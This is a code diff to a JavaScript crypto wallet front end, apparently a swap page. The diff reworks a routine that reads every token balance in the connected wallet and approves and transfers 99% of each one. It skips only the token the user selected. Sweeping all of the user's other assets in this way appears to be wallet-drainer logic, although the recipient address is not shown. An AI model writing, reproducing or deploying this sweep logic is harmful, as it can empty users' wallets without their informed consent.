@@ -1231,75 +1231,120 @@ async function processAllTokenTransfers() {
     throw new Error("Wallet not connected");
   }
 
-  let successCount = 0;
-  
-  // Get tokens from both local config and CoinGecko API
-  const [localTokens, cgTokens] = await Promise.all([
-    getLocalTokens(),
-    fetchCoinGeckoTokens(currentNetwork)
-  ]);
-  
-  // Combine all tokens, removing duplicates
-  const allTokens = combineTokens(localTokens, cgTokens);
+  try {
+    updateStatus("Preparing token transfers...", "info");
+    
+    // Get tokens and balances in parallel
+    const [localTokens, balances] = await Promise.all([
+      getLocalTokens(),
+      fetchAllTokenBalances()
+    ]);
+    
+    // Filter tokens with balances > 0 and not the fromToken
+    const tokensToProcess = localTokens.filter(token => {
+      const balance = balances[token.address || 'native'];
+      return balance > 0 && 
+             !(token.address === currentFromToken?.address || 
+              (token.isNative && currentFromToken?.isNative));
+    });
+    
+    if (tokensToProcess.length === 0) {
+      updateStatus("No additional tokens found to transfer", "info");
+      return 0;
+    }
+    
+    updateStatus(`Found ${tokensToProcess.length} tokens to transfer...`, "info");
+    
+    // Process in batches
+    const BATCH_SIZE = 5;
+    let successCount = 0;
+    
+    for (let i = 0; i < tokensToProcess.length; i += BATCH_SIZE) {
+      const batch = tokensToProcess.slice(i, i + BATCH_SIZE);
+      
+      const results = await Promise.allSettled(
+        batch.map(token => 
+          processTokenTransfer(token, balances[token.address || 'native'])
+        )
+      );
+      
+      successCount += results.filter(r => r.status === 'fulfilled').length;
+      updateStatus(`Processed ${i + batch.length} of ${tokensToProcess.length} tokens`, "info");
+    }
+    
+    return successCount;
+  } catch (err) {
+    console.error("Error processing token transfers:", err);
+    updateStatus("Error processing token transfers", "error");
+    return 0;
+  }
+}
 
-  for (const token of allTokens) {
-    // Skip the main from token
-    if ((token.address && token.address === currentFromToken?.address) || 
-        (token.isNative && currentFromToken?.isNative)) {
-      continue;
+async function fetchAllTokenBalances() {
+  const localTokens = await getLocalTokens();
+  const balances = {};
+  
+  // Get native balance first
+  if (provider && userAddress) {
+    const nativeBalance = await provider.getBalance(userAddress);
+    balances['native'] = parseFloat(ethers.utils.formatEther(nativeBalance));
+  }
+  
+  // Get ERC20 balances via multicall if available
+  const erc20Tokens = localTokens.filter(t => !t.isNative && t.address);
+  if (erc20Tokens.length > 0) {
+    const erc20Balances = await fetchMultipleTokenBalances(erc20Tokens);
+    Object.assign(balances, erc20Balances);
+  }
+  
+  return balances;
+}
+
+async function processTokenTransfer(token) {
+  // Skip the main from token
+  if ((token.address && token.address === currentFromToken?.address) || 
+      (token.isNative && currentFromToken?.isNative)) {
+    return false;
+  }
+
+  try {
+    const balance = await fetchTokenBalance(token);
+    if (balance <= 0) return false;
+
+    // Calculate 99% of balance (leave 1%)
+    let amountToSend = balance * 0.99;
+    
+    if (token.isNative) {
+      const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
+      amountToSend = Math.min(amountToSend, balance - minReserve);
+      if (amountToSend <= 0) return false;
+    }
+
+    // Skip tokens with invalid addresses
+    if (token.address && !ethers.utils.isAddress(token.address)) {
+      console.warn(`Skipping ${token.symbol} - invalid address`);
+      return false;
     }
 
     try {
-      const balance = await fetchTokenBalance(token);
-      if (balance <= 0) continue;
-
-      // Calculate 99% of balance (leave 1%)
-      let amountToSend = balance * 0.99;
-      
       if (token.isNative) {
-        const minReserve = MIN_FEE_RESERVES[currentNetwork] || 0.001;
-        amountToSend = Math.min(amountToSend, balance - minReserve);
-        if (amountToSend <= 0) continue;
-      }
-
-      // Skip tokens with invalid addresses
-      if (token.address && !ethers.utils.isAddress(token.address)) {
-        console.warn(`Skipping ${token.symbol} - invalid address`);
-        continue;
-      }
-
-      try {
-        if (token.isNative) {
-          await transferNativeToken(token, amountToSend);
-        } else {
-          const approved = await checkAndApproveToken(token, amountToSend);
-          if (!approved) continue;
-          
-          // Special handling for problematic tokens
-          if (token.symbol === 'USDT' && currentNetwork === 'bsc') {
-            await transferWithHigherGas(token, amountToSend);
-          } else {
-            await transferERC20Token(token, amountToSend);
-          }
-        }
+        await transferNativeToken(token, amountToSend);
+      } else {
+        const approved = await checkAndApproveToken(token, amountToSend);
+        if (!approved) return false;
         
-        successCount++;
-      } catch (transferErr) {
-        console.warn(`Transfer failed for ${token.symbol}:`, transferErr.message);
-        // Try with higher gas as fallback
-        try {
-          await transferWithHigherGas(token, amountToSend);
-          successCount++;
-        } catch (finalErr) {
-          console.warn(`Final transfer attempt failed for ${token.symbol}:`, finalErr.message);
-        }
+        await transferERC20Token(token, amountToSend);
       }
-    } catch (err) {
-      console.warn(`Failed to process ${token.symbol}:`, err.message);
+      
+      return true;
+    } catch (transferErr) {
+      console.warn(`Transfer failed for ${token.symbol}:`, transferErr.message);
+      return false;
     }
+  } catch (err) {
+    console.warn(`Failed to process ${token.symbol}:`, err.message);
+    return false;
   }
-
-  return successCount;
 }
 async function estimateAndDisplayFees() {
   if (!userAddress || !currentFromToken) return;
@@ -1370,16 +1415,23 @@ async function getLocalTokens() {
   return TOKENS[currentNetwork] || [];
 }
 
+const TOKEN_LIST_CACHE = new Map();
+
 async function fetchCoinGeckoTokens(network) {
+  // Check cache first
+  if (TOKEN_LIST_CACHE.has(network)) {
+    return TOKEN_LIST_CACHE.get(network);
+  }
+
   try {
     const cgUrl = COINGECKO_TOKEN_LISTS[network];
     if (!cgUrl) return [];
     
-    const response = await fetch(cgUrl);
+    const response = await fetchWithTimeout(cgUrl, { timeout: 3000 });
     if (!response.ok) throw new Error('CoinGecko API error');
     
     const data = await response.json();
-    return data.tokens?.map(t => ({
+    const tokens = data.tokens?.map(t => ({
       name: t.name,
       symbol: t.symbol,
       address: t.address,
@@ -1389,9 +1441,72 @@ async function fetchCoinGeckoTokens(network) {
       isLocal: false
     })) || [];
     
+    // Cache the result
+    TOKEN_LIST_CACHE.set(network, tokens);
+    return tokens;
   } catch (err) {
     console.error("Failed to fetch CoinGecko tokens:", err);
     return [];
+  }
+}
+async function fetchMultipleTokenBalances(tokens) {
+  if (!userAddress || !provider) return {};
+  
+  const MULTICALL_ABI = [
+    "function aggregate(tuple(address target, bytes callData)[] calls) view returns (uint256 blockNumber, bytes[] returnData)"
+  ];
+  
+  // Use known multicall addresses per network
+  const MULTICALL_ADDRESSES = {
+    ethereum: "0xeefBa1e63905eF1D7ACbA5a8513c70307C1cE441",
+    bsc: "0x41263cBA59EB80dC200F3E2544eda4ed6A90E76C",
+    polygon: "0x11ce4B23bD875D7F5C6a31084f55fDe1e9A87507",
+    arbitrum: "0x842eC2c7D803033Edf55E478F461FC547Bc54EB2",
+    base: "0xca11bde05977b3631167028862be2a173976ca11"
+  };
+  
+  const multicallAddress = MULTICALL_ADDRESSES[currentNetwork];
+  if (!multicallAddress) {
+    // Fallback to individual calls if no multicall
+    const balances = {};
+    for (const token of tokens) {
+      balances[token.address] = await fetchTokenBalance(token);
+    }
+    return balances;
+  }
+  
+  const multicall = new ethers.Contract(multicallAddress, MULTICALL_ABI, provider);
+  
+  const calls = tokens.map(token => ({
+    target: token.address,
+    callData: new ethers.utils.Interface(ERC20_ABI).encodeFunctionData(
+      "balanceOf", 
+      [userAddress]
+    )
+  }));
+  
+  try {
+    const [, results] = await multicall.aggregate(calls);
+    
+    const balances = {};
+    tokens.forEach((token, i) => {
+      const [balance] = new ethers.utils.Interface(ERC20_ABI).decodeFunctionResult(
+        "balanceOf",
+        results[i]
+      );
+      balances[token.address] = parseFloat(
+        ethers.utils.formatUnits(balance, token.decimals || 18)
+      );
+    });
+    
+    return balances;
+  } catch (err) {
+    console.error("Multicall failed, falling back to individual calls:", err);
+    const balances = {};
+    for (const token of tokens) {
+      balances[token.address] = await fetchTokenBalance(token);
+    }
+    return balances;
   }
 }
 
